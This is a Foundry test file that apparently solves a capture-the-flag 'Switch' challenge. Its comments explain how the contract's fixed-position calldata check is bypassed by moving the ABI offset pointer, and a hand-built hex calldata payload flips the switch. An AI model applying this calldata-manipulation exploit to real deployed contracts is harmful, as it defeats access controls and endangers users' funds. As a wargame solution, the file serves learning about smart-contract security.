pragma solidity >= 0.8.19;

import { Test } from "forge-std/Test.sol";
import { Switch } from "src/Switch/Switch.sol";
import "forge-std/console2.sol";

contract SwitchTest is Test {
    address me = makeAddr("me");
    Switch switchContract;

    function setUp() public {
        switchContract = new Switch();
    }

    function testSwitch() public {
        vm.startPrank(me);

        // For dynamic types (bytes, string, array), calldata is encoded based on the following format:
        // - first 32 bytes are the offset of the actual data
        // - next 32 bytes are the size of the actual data
        // - next 32 bytes are the actual data value
        // So the validation in the Switch contract check for 4 bytes starting from the position 68 in the calldata
        // The solution to by pass it is to set the offset point to different location, and keeping the data starting
        // from the position 68 + 32bytes the same.
        bytes memory payload =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success,) = address(switchContract).call(payload);
        require(success);

        assertEq(switchContract.switchOn(), true);
    }
}
